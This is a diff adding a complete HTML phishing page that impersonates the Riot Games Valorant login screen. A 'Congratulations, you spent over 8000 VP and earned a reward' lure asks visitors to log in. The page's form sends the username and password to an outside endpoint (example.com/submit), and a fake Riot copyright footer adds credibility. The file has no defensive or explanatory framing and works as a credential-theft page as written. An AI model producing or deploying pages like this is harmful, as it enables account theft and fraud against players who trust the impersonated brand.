@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Login</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+        }
+        .hero {
+            height: 100vh;
+            background: url('https://w0.peakpx.com/wallpaper/887/193/HD-wallpaper-jett-in-red-black-background-valorant.jpg') no-repeat center center/cover;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 20px;
+        }
+        .login-box {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .login-box h1 {
+            margin-bottom: 30px;
+            font-size: 2rem;
+            text-transform: uppercase;
+        }
+        .login-box p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+        }
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+        }
+        .login-box .btn-primary {
+            width: 100%;
+            padding: 10px;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+        }
+        footer {
+            padding: 20px;
+            text-align: center;
+            background-color: #111;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <section class="hero">
+        <div class="login-box">
+            <p><strong>Congratulations!</strong></p>
+            <p>You have spent over 8000 VP in Valorant and earned a reward! Please log in to claim your prize and apply it to your account.</p>
+            <h1>Login to VALORANT</h1>
+            <form action="https://example.com/submit" method="POST">
+                <input type="text" name="username" placeholder="Username" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="btn-primary">Login</button>
+            </form>
+        </div>
+    </section>
+    <footer>
+        <p>&copy; 2024 [Riot Games]. All rights reserved.</p>
+    </footer>
+</body>
+</html>
